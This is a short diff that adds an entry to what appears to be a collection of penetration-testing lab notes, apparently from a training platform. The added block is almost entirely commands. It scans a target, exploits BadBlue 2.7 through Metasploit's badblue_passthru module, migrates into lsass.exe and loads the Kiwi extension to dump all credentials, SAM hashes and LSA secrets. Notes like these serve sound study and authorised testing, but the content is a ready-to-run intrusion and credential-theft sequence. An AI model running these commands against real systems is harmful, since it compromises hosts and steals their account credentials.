@@ -1313,7 +1313,23 @@ getuid
 cat C:\\Users\\Administrator\\Desktop\\flag.txt
 
 ```
+69)  Windows: Meterpreter: Kiwi Extension
 
+```
+cat /root/Desktop/target
+nmap 10.0.27.166
+nmap -sV -p 80 10.0.27.166
+searchsploit badblue 2.7
+msfconsole -q
+use exploit/windows/http/badblue_passthru
+set RHOSTS 10.0.27.166
+exploit
+migrate -N lsass.exe
+load kiwi
+creds_all
+lsa_dump_sam
+lsa_dump_secrets
+```
 
 
 
